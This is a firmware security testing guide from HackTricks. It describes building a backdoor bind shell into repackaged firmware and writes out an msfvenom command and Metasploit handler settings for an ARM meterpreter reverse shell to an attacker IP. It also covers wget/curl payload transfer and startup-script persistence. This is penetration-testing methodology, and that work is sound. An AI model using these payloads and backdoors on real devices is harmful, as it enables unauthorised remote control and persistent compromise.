

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


### This page was copied from [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Attempt to **upload custom firmware and/or compiled binaries** for integrity or signature verification flaws. For example, compile a backdoor bind shell that starts upon boot using the following steps.

1. Extract firmware with firmware-mod-kit (FMK)
2. Identify the target firmware architecture and endianness
3. Build a cross compiler with Buildroot or use other methods that suits your environment
4. Use cross compiler to build the backdoor
5. Copy the backdoor to extracted firmware /usr/bin
6. Copy appropriate QEMU binary to extracted firmware rootfs
7. Emulate the backdoor using chroot and QEMU
8. Connect to backdoor via netcat
9. Remove QEMU binary from extracted firmware rootfs
10. Repackage the modified firmware with FMK
11. Test backdoored firmware by emulating with firmware analysis toolkit (FAT) and connecting to the target backdoor IP and port using netcat

If a root shell has already been obtained from dynamic analysis, bootloader manipulation, or hardware security testing means, attempt to execute precompiled malicious binaries such as implants or reverse shells. Consider using automated payload/implant tools used for command and control (C\&C) frameworks. For example, Metasploit framework and ‘msfvenom’ can be leveraged using the following steps.

1. Identify the target firmware architecture and endianness
2. Use `msfvenom` to specify the appropriate target payload (-p), attacker host IP (LHOST=), listening port number (LPORT=) filetype (-f), architecture (--arch), platform (--platform linux or windows), and the output file (-o). For example, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. Transfer the payload to the compromised device (e.g. Run a local webserver and wget/curl the payload to the filesystem) and ensure the payload has execution permissions
4. Prepare Metasploit to handle incoming requests. For example, start Metasploit with msfconsole and use the following settings according to the payload above: use exploit/multi/handler,
   * `set payload linux/armle/meterpreter_reverse_tcp`
   * `set LHOST 192.168.1.245 #attacker host IP`
   * `set LPORT 445 #can be any unused port`
   * `set ExitOnSession false`
   * `exploit -j -z`
5. Execute the meterpreter reverse 🐚 on the compromised device
6. Watch meterpreter sessions open
7. Perform post exploitation activities

If possible, identify a vulnerability within startup scripts to obtain persistent access to a device across reboots. Such vulnerabilities arise when startup scripts reference, [symbolically link](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), or depend on code located in untrusted mounted locations such as SD cards, and flash volumes used for storage data outside of root filesystems.


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


